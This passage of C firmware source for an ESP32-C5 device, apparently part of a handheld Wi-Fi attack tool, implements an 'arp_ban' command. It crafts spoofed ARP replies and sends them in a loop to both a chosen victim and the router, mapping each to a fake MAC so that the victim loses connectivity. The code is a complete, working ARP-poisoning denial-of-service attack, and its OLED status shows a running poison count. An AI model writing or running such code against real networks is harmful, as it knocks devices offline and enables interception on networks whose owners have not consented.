Smethan/projectZero/ESP32C5/main/main.c
    // Ethernet header (14 bytes)
    memcpy(&arp_packet[0], dst_mac, 6);              // Destination MAC
    memcpy(&arp_packet[6], src_mac, 6);              // Source MAC (fake)
    arp_packet[12] = (ETH_TYPE_ARP >> 8) & 0xFF;     // EtherType ARP (0x0806)
    arp_packet[13] = ETH_TYPE_ARP & 0xFF;
    
    // ARP header (28 bytes)
    arp_packet[14] = (ARP_HWTYPE_ETH >> 8) & 0xFF;   // Hardware type: Ethernet (1)
    arp_packet[15] = ARP_HWTYPE_ETH & 0xFF;
    arp_packet[16] = (ARP_PROTO_IP >> 8) & 0xFF;     // Protocol type: IPv4 (0x0800)
    arp_packet[17] = ARP_PROTO_IP & 0xFF;
    arp_packet[18] = 6;                               // Hardware address length
    arp_packet[19] = 4;                               // Protocol address length
    arp_packet[20] = (ARP_OP_REPLY >> 8) & 0xFF;     // Operation: ARP Reply (2)
    arp_packet[21] = ARP_OP_REPLY & 0xFF;
    
    // Sender hardware address (fake MAC)
    memcpy(&arp_packet[22], sender_mac, 6);
    
    // Sender protocol address (spoofed IP)
    arp_packet[28] = sender_ip & 0xFF;
    arp_packet[29] = (sender_ip >> 8) & 0xFF;
    arp_packet[30] = (sender_ip >> 16) & 0xFF;
    arp_packet[31] = (sender_ip >> 24) & 0xFF;
    
    // Target hardware address
    memcpy(&arp_packet[32], target_mac, 6);
    
    // Target protocol address
    arp_packet[38] = target_ip & 0xFF;
    arp_packet[39] = (target_ip >> 8) & 0xFF;
    arp_packet[40] = (target_ip >> 16) & 0xFF;
    arp_packet[41] = (target_ip >> 24) & 0xFF;
    
    // Allocate pbuf and send
    struct pbuf *p = pbuf_alloc(PBUF_RAW, ARP_PACKET_SIZE, PBUF_RAM);
    if (p != NULL) {
        memcpy(p->payload, arp_packet, ARP_PACKET_SIZE);
        lwip_netif->linkoutput(lwip_netif, p);
        pbuf_free(p);
    }
}

static void arp_ban_task(void *pvParameters) {
    (void)pvParameters;
    
    // Get netif
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    if (!sta_netif) {
        MY_LOG_INFO(TAG, "ARP ban: STA netif not found");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    struct netif *lwip_netif = esp_netif_get_netif_impl(sta_netif);
    if (!lwip_netif) {
        MY_LOG_INFO(TAG, "ARP ban: LwIP netif not found");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    if (!lwip_netif->linkoutput) {
        MY_LOG_INFO(TAG, "ARP ban: netif has no linkoutput function");
        arp_ban_task_handle = NULL;
        vTaskDelete(NULL);
        return;
    }
    
    // Fake MAC (non-existent address to break connectivity)
    uint8_t fake_mac[6] = { 0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00 };
    
    MY_LOG_INFO(TAG, "ARP ban: Poisoning both victim and router");
    uint32_t arp_cycle = 0;
    
    while (arp_ban_active) {
        // Packet 1: To VICTIM - "Gateway IP is at fake MAC"
        send_arp_reply(lwip_netif,
                       arp_ban_target_mac,       // Eth dst: victim
                       fake_mac,                  // Eth src: fake
                       fake_mac,                  // ARP sender MAC: fake
                       arp_ban_gateway_ip.addr,   // ARP sender IP: gateway (spoofed!)
                       arp_ban_target_mac,        // ARP target MAC: victim
                       arp_ban_target_ip.addr);   // ARP target IP: victim
        
        vTaskDelay(pdMS_TO_TICKS(50));  // Small delay between packets
        
        // Packet 2: To ROUTER - "Victim IP is at fake MAC"
        send_arp_reply(lwip_netif,
                       arp_ban_gateway_mac,       // Eth dst: router
                       fake_mac,                  // Eth src: fake
                       fake_mac,                  // ARP sender MAC: fake
                       arp_ban_target_ip.addr,    // ARP sender IP: victim (spoofed!)
                       arp_ban_gateway_mac,       // ARP target MAC: router
                       arp_ban_gateway_ip.addr);  // ARP target IP: router
        
        arp_cycle++;
        if (arp_cycle % 4 == 0) {
            char arp_l2[64], arp_l3[64], arp_l4[64];
            snprintf(arp_l2, sizeof(arp_l2), "  %02X:%02X:%02X:%02X",
                     arp_ban_target_mac[2], arp_ban_target_mac[3],
                     arp_ban_target_mac[4], arp_ban_target_mac[5]);
            snprintf(arp_l3, sizeof(arp_l3), "  %d.%d.%d.%d",
                     ip4_addr1(&arp_ban_target_ip), ip4_addr2(&arp_ban_target_ip),
                     ip4_addr3(&arp_ban_target_ip), ip4_addr4(&arp_ban_target_ip));
            snprintf(arp_l4, sizeof(arp_l4), "  Poison #%lu", (unsigned long)arp_cycle);
            oled_display_update_full("> ARP Ban", arp_l2, arp_l3, arp_l4);
        }
        
        vTaskDelay(pdMS_TO_TICKS(450)); // Total ~500ms cycle
    }
    
    MY_LOG_INFO(TAG, "ARP ban task stopped");
    arp_ban_task_handle = NULL;
    vTaskDelete(NULL);
}

static int cmd_arp_ban(int argc, char **argv) {
    oled_display_update_full("> ARP Ban",
        argc >= 2 ? argv[1] : "  No MAC",
        "  Poison active", "  Blocking...");
    if (argc < 2) {
        MY_LOG_INFO(TAG, "Usage: arp_ban <MAC> [IP]");
        MY_LOG_INFO(TAG, "Example: arp_ban AA:BB:CC:DD:EE:FF 192.168.1.50");
        MY_LOG_INFO(TAG, "If IP is omitted, it will be looked up from ARP table.");
        return 1;
    }
    
    // Check if already running
    if (arp_ban_active || arp_ban_task_handle != NULL) {
        MY_LOG_INFO(TAG, "ARP ban already running. Use 'stop' first.");
        return 1;
    }
    
    // Check if connected to AP
    wifi_ap_record_t ap_info;
    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK) {
        MY_LOG_INFO(TAG, "Not connected to any AP. Use 'wifi_connect' first.");
        return 1;
    }
    
    // Parse MAC address
    if (!parse_mac_address(argv[1], arp_ban_target_mac)) {
        MY_LOG_INFO(TAG, "Invalid MAC format. Use AA:BB:CC:DD:EE:FF");
        return 1;
    }
    
    // Parse optional IP or try to find it in ARP table
    if (argc >= 3) {
        uint32_t ip = esp_ip4addr_aton(argv[2]);
        if (ip == 0) {
            MY_LOG_INFO(TAG, "Invalid IP address: %s", argv[2]);
            return 1;
        }
        arp_ban_target_ip.addr = ip;
    } else {
        // Try to find IP from ARP table
        bool found = false;
        for (int i = 0; i < ARP_TABLE_SIZE; i++) {
            ip4_addr_t *ip_ret;
            struct netif *netif_ret;
            struct eth_addr *eth_ret;
            if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
                if (memcmp(eth_ret->addr, arp_ban_target_mac, 6) == 0) {
                    arp_ban_target_ip.addr = ip_ret->addr;
                    found = true;
                    MY_LOG_INFO(TAG, "Found IP %d.%d.%d.%d for target MAC",
                               ip4_addr1(ip_ret), ip4_addr2(ip_ret), 
                               ip4_addr3(ip_ret), ip4_addr4(ip_ret));
                    break;
                }
            }
        }
        if (!found) {
            MY_LOG_INFO(TAG, "MAC not found in ARP table. Run 'list_hosts' first or specify IP.");
            return 1;
        }
    }
    
    // Get gateway info
    esp_netif_t *sta_netif = esp_netif_get_handle_from_ifkey("WIFI_STA_DEF");
    esp_netif_ip_info_t ip_info;
    esp_netif_get_ip_info(sta_netif, &ip_info);
    
    // Store gateway IP
    arp_ban_gateway_ip.addr = ip_info.gw.addr;
    
    // Find gateway MAC from ARP table
    bool gateway_found = false;
    for (int i = 0; i < ARP_TABLE_SIZE; i++) {
        ip4_addr_t *ip_ret;
        struct netif *netif_ret;
        struct eth_addr *eth_ret;
        if (etharp_get_entry(i, &ip_ret, &netif_ret, &eth_ret) == 1) {
            if (ip_ret->addr == ip_info.gw.addr) {
                memcpy(arp_ban_gateway_mac, eth_ret->addr, 6);
                gateway_found = true;
                break;
            }
        }
    }
    
